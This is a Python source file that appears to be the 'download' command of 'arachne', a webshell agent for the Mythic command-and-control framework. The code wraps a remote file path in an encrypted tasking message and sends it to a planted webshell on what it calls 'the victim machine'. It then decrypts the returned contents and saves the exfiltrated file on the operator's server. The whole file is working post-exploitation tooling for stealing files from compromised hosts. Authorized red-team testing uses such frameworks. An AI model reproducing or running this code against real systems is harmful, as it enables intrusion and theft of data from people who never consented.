import pathlib

from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from arachne.WebshellRPC import WebshellRPC


class DownloadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(name="file_path",
                             type=ParameterType.String,
                             description="Path to remote file to be downloaded")
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("file_path", self.command_line)
        else:
            raise ValueError("Missing arguments")


class DownloadCommand(CommandBase):
    cmd = "download"
    needs_admin = False
    help_cmd = "download [path to remote file]"
    description = "Download a file from the victim machine (no need for quotes in the path)"
    version = 1
    supported_ui_features = ["file_browser:download"]
    author = "@its_a_feature_"
    argument_class = DownloadArguments
    attackmapping = []
    browser_script = BrowserScript(script_name="download", author="@its_a_feature_", for_new_ui=True)

    async def create_go_tasking(self,
                                taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=False,
            Completed=True,
        )
        filename = pathlib.Path(taskData.args.get_arg("file_path")).name
        response.DisplayParams = filename
        message = "{}|{}|{}".format(taskData.Task.AgentTaskID,
                                    base64.b64encode(self.cmd.encode('UTF8')).decode(),
                                    base64.b64encode(taskData.args.get_arg("file_path").encode('UTF8')).decode())
        encrypted_resp = await SendMythicRPCCallbackEncryptBytes(MythicRPCCallbackEncryptBytesMessage(
            AgentCallbackUUID=taskData.Callback.AgentCallbackID,
            Message=message.encode(),
            IncludesUUID=False,
            IsBase64Encoded=False
        ))
        if encrypted_resp.Success:
            try:
                response_data = await WebshellRPC.GetRequest(taskData.Payload.UUID,
                                                             encrypted_resp.Message,
                                                             taskData)
                if len(response_data) == 0:
                    taskData.args.set_manual_args(message)
                    response.Completed = False
                    response.Success = True
                    return response
                decrypted_resp = await SendMythicRPCCallbackDecryptBytes(MythicRPCCallbackDecryptBytesMessage(
                    AgentCallbackUUID=taskData.Callback.AgentCallbackID,
                    Message=response_data,
                    IncludesUUID=False,
                    IsBase64Encoded=True
                ))
                if decrypted_resp.Success:
                    file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                        TaskID=taskData.Task.ID,
                        FileContents=base64.b64decode("|".join(decrypted_resp.Message.decode("UTF8").split("|")[1:]).encode("UTF8")),
                        RemotePathOnTarget=taskData.args.get_arg("file_path"),
                        Filename=taskData.args.get_arg("file_path"),
                        IsDownloadFromAgent=True,
                        IsScreenshot=False,
                        DeleteAfterFetch=False,

                    ))
                    if file_resp.Success:
                        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                            TaskID=taskData.Task.ID,
                            Response="Successfully downloaded {}\nFileID: {}".format(taskData.args.get_arg("file_path"),
                                                                                     file_resp.AgentFileId).encode(),
                        ))
                    else:
                        response.TaskStatus = "error: failed to save file"
                        response.Error = file_resp.Error
                else:
                    response.TaskStatus = "error: decryption"
                    response.Error = decrypted_resp.Error
            except Exception as e:
                response.TaskStatus = "error: processing"
                response.Error = str(e)
        else:
            response.TaskStatus = "error: encryption"
            response.Error = encrypted_resp.Error
        if response.Error != "":
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=response.Error.encode(),
            ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        filename = pathlib.Path(task.Task.DisplayParams).name
        file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
            TaskID=task.Task.ID,
            FileContents=base64.b64decode(response),
            RemotePathOnTarget=task.Task.DisplayParams,
            Filename=filename,
            IsDownloadFromAgent=True,
            IsScreenshot=False,
            DeleteAfterFetch=False,

        ))
        if file_resp.Success:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response="Successfully downloaded file\nFileID: {}".format(file_resp.AgentFileId).encode(),
            ))
        else:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=file_resp.Error.encode("UTF8"),
            ))
        return resp
